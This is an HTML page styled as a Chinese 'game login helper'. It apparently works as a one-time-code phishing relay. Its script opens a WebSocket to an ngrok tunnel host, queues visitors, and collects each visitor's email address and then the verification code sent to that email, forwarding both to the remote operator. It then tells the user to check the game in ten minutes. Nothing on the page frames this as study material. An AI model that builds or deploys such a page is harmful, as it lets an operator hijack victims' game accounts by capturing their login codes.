<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>游戏登录助手</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center}
.box{background:#1e293b;padding:30px;border-radius:16px;width:100%;max-width:400px;color:#fff}
.title{font-size:22px;text-align:center;margin-bottom:20px}
.status{padding:12px;border-radius:8px;text-align:center;margin-bottom:16px;font-weight:500}
.waiting{background:#7c7000;color:#fffa}
.using{background:#006500;color:#fffa}
.disconnect{background:#650000;color:#fffa}
.time{text-align:center;margin-bottom:10px;color:#ccc}
.tip-box{padding:10px;background:#0f172a;border-radius:6px;font-size:14px;color:#94a3b8;text-align:center;margin-bottom:16px}
input{width:100%;padding:12px;border-radius:8px;border:none;margin-bottom:10px;background:#334155;color:#fff}
button{width:100%;padding:12px;border-radius:8px;border:none;background:#4f46e5;color:white;font-weight:bold;cursor:pointer;margin-bottom:10px}
button:disabled{background:#475569;cursor:not-allowed}
.log{margin-top:16px;padding:10px;background:#0f172a;border-radius:6px;font-size:13px;color:#ccc}
.btn-row{display:flex;gap:10px;margin-bottom:10px}
.btn-row button{flex:1;margin-bottom:0}
.edit-btn{background:#64748b}
</style>
</head>
<body>
<div class="box">
  <div class="title">游戏登录助手</div>
  <div class="status disconnect" id="status">未连接</div>
  <div class="time" id="timer"></div>
  <div class="tip-box" id="tipText">提交邮箱后，请到邮箱查看验证码邮件，并填入下方输入框</div>
  <input type="text" id="email" placeholder="邮箱">
  <div class="btn-row">
    <button id="btnEmail" disabled>提交邮箱</button>
    <button class="edit-btn" id="editEmail" disabled>修改</button>
  </div>
  <input type="text" id="code" placeholder="验证码">
  <div class="btn-row">
    <button id="btnCode" disabled>提交验证码</button>
    <button class="edit-btn" id="editCode" disabled>修改</button>
  </div>
  <div class="log" id="log"></div>
</div>
<script>
const WS_URL = "wss://draw-residence-scrutiny.ngrok-free.dev";
let ws, heartbeatTimer, timerCount, timeLeft = 300;
let emailSubmitted = false, codeSubmitted = false;
function status(txt, cls){document.getElementById('status').innerText=txt;document.getElementById('status').className='status '+cls;}
function log(txt){document.getElementById('log').innerText=txt;}
function setTip(txt){document.getElementById('tipText').innerText=txt;}
function startTimer(){clearInterval(timerCount);timeLeft=300;timerCount=setInterval(()=>{timeLeft--;let m=Math.floor(timeLeft/60),s=timeLeft%60;document.getElementById('timer').innerText=`剩余时间：${m}分${s}秒`;if(timeLeft<=0){clearInterval(timerCount);timerCount=null;status("已超时，请刷新","waiting");}},1000);}
function sendHeart(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:"heartbeat"}));}
function sendEmail(){const btnEmail=document.getElementById('btnEmail');const v=document.getElementById('email').value.trim();if(!v||btnEmail.disabled)return;ws.send(JSON.stringify({type:"email",content:v}));log("✅ 提交成功！");emailSubmitted=true;btnEmail.textContent="已提交";btnEmail.disabled=true;document.getElementById('email').readOnly=true;document.getElementById('editEmail').disabled=false;document.getElementById('btnCode').disabled=false;setTip("✅ 已发送验证码邮件！请到邮箱查看后填入下方「验证码」输入框");}
function resetEmail(){const btnEmail=document.getElementById('btnEmail');emailSubmitted=false;btnEmail.textContent="提交邮箱";btnEmail.disabled=false;document.getElementById('email').readOnly=false;document.getElementById('editEmail').disabled=true;document.getElementById('btnCode').disabled=true;document.getElementById('code').value="";resetCode();setTip("提交邮箱后，请到邮箱查看验证码邮件，并填入下方输入框");}
function sendCode(){const btnCode=document.getElementById('btnCode');const v=document.getElementById('code').value.trim();if(!v||btnCode.disabled)return;ws.send(JSON.stringify({type:"code",content:v}));log("验证码已提交");codeSubmitted=true;btnCode.textContent="已提交";btnCode.disabled=true;document.getElementById('code').readOnly=true;document.getElementById('editCode').disabled=false;setTip("✅ 验证码已提交，正在处理你的请求，请十分钟后上游戏查看");}
function resetCode(){const btnCode=document.getElementById('btnCode');codeSubmitted=false;btnCode.textContent="提交验证码";btnCode.disabled=false;document.getElementById('code').readOnly=false;document.getElementById('editCode').disabled=true;}
function connect(){status("正在连接...","disconnect");log("连接中");ws=new WebSocket(WS_URL);ws.onopen=()=>{status("已连接，查询状态...","waiting");log("连接成功");heartbeatTimer=setInterval(sendHeart,1000);};ws.onmessage=(e)=>{const d=JSON.parse(e.data);if(d.status==="ok"){if(!timerCount)startTimer();status("✅ 正在使用（5分钟）","using");if(!emailSubmitted)document.getElementById('btnEmail').disabled=false;}else if(d.status==="waiting"){status(`⌛ 排队中 | 前面有${d.queue}人`,"waiting");log("等待上一位结束...");document.getElementById('btnEmail').disabled=true;document.getElementById('btnCode').disabled=true;}};ws.onclose=()=>{clearInterval(heartbeatTimer);clearInterval(timerCount);timerCount=null;status("连接断开","disconnect");log("已断开，请刷新");document.getElementById('btnEmail').disabled=true;document.getElementById('btnCode').disabled=true;};}
document.getElementById('btnEmail').onclick=sendEmail;document.getElementById('editEmail').onclick=resetEmail;document.getElementById('btnCode').onclick=sendCode;document.getElementById('editCode').onclick=resetCode;
window.onload=connect;
</script>
</body>
</html>
